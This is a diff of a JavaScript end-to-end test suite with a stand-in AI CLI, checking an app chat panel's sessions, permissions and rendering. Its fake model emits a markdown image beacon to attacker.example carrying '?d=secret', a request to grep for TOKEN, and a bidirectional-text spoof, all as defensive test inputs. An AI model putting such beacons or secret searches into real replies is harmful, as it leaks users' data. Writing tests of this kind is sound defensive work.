@@ -40,8 +40,8 @@ let init = false; let n = 0; let stopped = false;
 const ask = (tool, input) => out({ type: 'control_request', request_id: 'r' + (++n), request: { subtype: 'can_use_tool', tool_name: tool, input } });
 function turn(text) {
   if (!init) { init = true; out({ type: 'system', subtype: 'init', session_id: id, model: 'x', tools: [], mcp_servers: [], slash_commands: [], permissionMode: 'default', cwd: process.cwd() }); }
-  const dir = join(homedir(), '.claude', 'projects', 'standin'); mkdirSync(dir, { recursive: true });
-  writeFileSync(join(dir, id + '.jsonl'), JSON.stringify({ type: 'user', sessionId: id, message: { role: 'user', content: text } }) + '\\n');
+  const dir = join(homedir(), '.claude', 'projects', require('node:fs').realpathSync(process.cwd()).replace(/[^a-zA-Z0-9]/g, '-')); mkdirSync(dir, { recursive: true });
+  appendFileSync(join(dir, id + '.jsonl'), JSON.stringify({ type: 'user', sessionId: id, cwd: process.cwd(), uuid: 'u' + Date.now(), timestamp: new Date().toISOString(), message: { role: 'user', content: text } }) + '\\n');
   stopped = false;
   if (text === 'PERM') return ask('Bash', { command: 'grep -r TOKEN .' });
   if (text === 'BIDI') return ask('Bash', { command: 'echo safe\\u202e\\u200bdanger' });
@@ -58,14 +58,17 @@ function turn(text) {
     out({ type: 'user', session_id: id, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'ok' }] } });
     return say('read it');
   }
-  if (text === 'ROTATE') { id = '${'11111111-2222-4333-8444-555555555555'}'; out({ type: 'system', subtype: 'init', session_id: id, model: 'x', tools: [], mcp_servers: [], slash_commands: [], permissionMode: 'default', cwd: process.cwd() }); return say('rotated'); }
+  if (text === 'ROTATE') { id = require('node:crypto').randomUUID(); require('node:fs').writeFileSync(join(homedir(), 'rotated'), id); out({ type: 'system', subtype: 'init', session_id: id, model: 'x', tools: [], mcp_servers: [], slash_commands: [], permissionMode: 'default', cwd: process.cwd() }); return say('rotated'); }
   if (text === 'LIMIT') {
     out({ type: 'rate_limit_event', session_id: id, rate_limit_info: { status: 'rejected', rateLimitType: 'five_hour', resetsAt: Math.floor(Date.now() / 1000) + 3600 } });
     out({ type: 'assistant', session_id: id, message: { role: 'assistant', content: [{ type: 'text', text: "You've hit your session limit" }] } });
     return out({ type: 'result', subtype: 'success', is_error: true, result: "You've hit your session limit", session_id: id, num_turns: 1, total_cost_usd: 0, usage: { input_tokens: 1, output_tokens: 1 } });
   }
   if (text === 'SLOW') { setTimeout(() => { if (!stopped) say('slow answer'); }, 6000); return; }
-  say('answer to ' + text);
+  if (text === 'FILE') return say('Bak: \`public/readme.txt\`');
+  if (text === 'IMG') return say('![x](https://attacker.example/beacon.png?d=secret) resim bitti');
+  // A beat, like any model: a bubble measured under it cannot be the reply's.
+  setTimeout(() => say('answer to ' + text), 250);
 }
 let buf = '';
 process.stdin.on('data', (c) => {
@@ -124,6 +127,8 @@ const records = () => {
   return existsSync(dir) ? readdirSync(dir).filter((x) => /^[0-9a-f-]{36}\.json$/.test(x)) : [];
 };
 const rgb = (s) => (s.match(/[\d.]+/g) ?? []).slice(0, 3).map(Number);
+const spawns = () => readFileSync(join(app.home, 'argv.jsonl'), 'utf-8').trim().split('\n').map((l) => JSON.parse(l)).filter((x) => x.includes('--input-format'));
+const spawnCount = () => readFileSync(join(app.home, 'argv.jsonl'), 'utf-8').trim().split('\n').filter((l) => l.includes('--input-format')).length;
 const near = (a, b) => a.length === 3 && b.length === 3 && a.every((v, i) => Math.abs(v - b[i]) <= 2);
 
 try {
@@ -234,12 +239,46 @@ try {
     await p.waitForTimeout(800);
     await send(f, 'after stop'); await see(f, where, 'answer to after stop');
 
-    // A second session beside it, then a reload that makes nothing new.
+    // A message typed into a running turn reaches it.
+    const stdin = () => readFileSync(join(app.home, 'stdin.jsonl'), 'utf-8');
+    await send(f, 'SLOW');
+    await p.waitForTimeout(400);
+    await send(f, 'steer this');
+    await p.waitForTimeout(800);
+    if (!stdin().includes('steer this')) app.findings.push(`${where}: steering never reached the turn`);
+    await see(f, where, 'slow answer', 9000);
+
+    // A remote image in model text: nothing fetched, nothing drawn.
+    const beacons = [];
+    p.on('request', (r) => { if (r.url().includes('attacker.example')) beacons.push(r.url()); });
+    await send(f, 'IMG'); await see(f, where, 'resim bitti');
+    await p.waitForTimeout(400);
+    if (beacons.length) app.findings.push(`${where}: a remote image went out: ${beacons[0]}`);
+
+    // An app file, in the slide-over, with no grant.
+    await send(f, 'FILE');
+    const chip = f.getByText('public/readme.txt', { exact: false }).first();
+    await chip.click({ timeout: 8000 }).catch(() => app.findings.push(`${where}: no file chip`));
+    await see(f, where, 'app file');
+    await p.keyboard.press('Escape');
+    await p.waitForTimeout(300);
+
+    // A rotation: the record follows, a reload makes no twin.
+    await send(f, 'ROTATE'); await see(f, where, 'rotated');
+    if (!existsSync(join(app.home, '.dreamcontext', 'apps', 'chats', `${readFileSync(join(app.home, 'rotated'), 'utf-8')}.json`))) app.findings.push(`${where}: no record for the successor`);
+
+    // Two at once: the first still running while the second answers.
+    await send(f, 'SLOW');
     await f.locator('.app-chat-new').click();
     await p.waitForTimeout(800);
     const f2 = await frameOf(p);
     await send(f2, 'ikinci'); await see(f2, where, 'answer to ikinci');
+    await f2.locator('.app-chat-tab-name').first().click();
+    await see(f2, where, 'slow answer', 9000);
+    await f2.locator('.app-chat-tab-name').last().click();
+    await p.waitForTimeout(300);
     const before = records().length;
+    const spawned = spawnCount();
     await p.goto(await windowUrl('demo'), { waitUntil: 'domcontentloaded' });
     const f3 = await frameOf(p);
     if (f3) {
@@ -247,6 +286,13 @@ try {
       const rows = await f3.locator('.app-chat-tab').count();
       if (rows < 2) app.findings.push(`${where}: a reload shows ${rows} row(s)`);
       if (records().length !== before) app.findings.push(`${where}: a reload made a record`);
+      if (spawnCount() !== spawned) app.findings.push(`${where}: a reload spawned ${spawnCount() - spawned} child(ren) beside live ones`);
+
+      // History: the app's own rows, and a pick lands back on the strip.
+      await f3.locator('.app-chat-history').click();
+      await p.waitForTimeout(800);
+      if (!await f3.locator('.chp-list [role="option"], .chp-list button').first().isVisible().catch(() => false)) app.findings.push(`${where}: the history shows nothing`);
+      await p.keyboard.press('Escape');
       const refused = await f3.evaluate(() => { try { new WebSocket('ws://127.0.0.1:1/api/agent/terminal'); return false; } catch { return true; } });
       if (!refused) app.findings.push(`${where}: a non-app WebSocket opened`);
     }
@@ -273,6 +319,42 @@ try {
     if (clip.bottom > clip.h || clip.top < 0) app.findings.push(`lite@${w.name}: clipped at 560: ${JSON.stringify(clip)}`);
   }, { name: 'app-chat-lite' });
 
+  // The seventh chat: a plain refusal, no record, and a closed one frees its seat.
+  await app.look('/?vault=proj', async (p, w) => {
+    if (w.name !== 'desktop') return;
+    await p.goto(await windowUrl('lite'), { waitUntil: 'domcontentloaded' });
+    let f = await frameOf(p);
+    for (let i = 0; i < 6 && f; i++) {
+      await send(f, `dolu ${i}`); await see(f, `cap@${i}`, `answer to dolu ${i}`);
+      await f.locator('.app-chat-new').click(); await p.waitForTimeout(500);
+      f = await frameOf(p) ?? f;
+    }
+    await see(f, 'cap', 'chats running');
+    const n = records().length;
+    await f.locator('.app-chat-tab-close').first().click();
+    await p.waitForTimeout(1500);
+    await f.locator('.app-chat-new').click();
+    await p.waitForTimeout(1200);
+    await send(f, 'yedinci'); await see(f, 'cap', 'answer to yedinci');
+    if (records().length !== n + 1) app.findings.push(`cap: ${records().length - n} records for one new chat`);
+  }, { name: 'app-chat-cap' });
+
+  // A bound member: same screen, its level, free capped at auto.
+  cli('agents', 'create', 'ua', '--title', 'UA Manager', '--prompt', 'Run the ads.');
+  cli('agents', 'edit', 'ua', '--autonomy', 'free');
+  cli('apps', 'new', 'bound', '--name', 'Bound');
+  page(join(root('bound'), 'public'), '#ffffff', '#111111');
+  cli('apps', 'assign', 'bound', 'ua');
+  await app.look('/?vault=proj', async (p, w) => {
+    await p.goto(await windowUrl('bound'), { waitUntil: 'domcontentloaded' });
+    const f = await frameOf(p);
+    if (!f) { app.findings.push(`member@${w.name}: no composer`); return; }
+    await send(f, 'uye'); await see(f, `member@${w.name}`, 'answer to uye');
+    const last = spawns().pop();
+    if (last[last.indexOf('--permission-mode') + 1] !== 'auto') app.findings.push(`member: permission ${last[last.indexOf('--permission-mode') + 1]}`);
+    if (!last.join(' ').includes('Bash(dreamcontext apps call:*)')) app.findings.push('member: apps call is not denied');
+  }, { name: 'app-chat-member' });
+
   // An app moved to its own assistant, from a scratch copy of its migration branch.
   if (process.env.DC_YUK_COPY) {
     cli('apps', 'new', 'yuk-izleme', '--name', 'Yük İzleme');
@@ -293,7 +375,6 @@ try {
   }
 
   // The envelope, read off the stand-in's argv.
-  const spawns = () => readFileSync(join(app.home, 'argv.jsonl'), 'utf-8').trim().split('\n').map((l) => JSON.parse(l)).filter((x) => x.includes('--input-format'));
   const argvs = spawns();
   const a = argvs[0];
   const count = (x) => a.filter((v) => v === x).length;
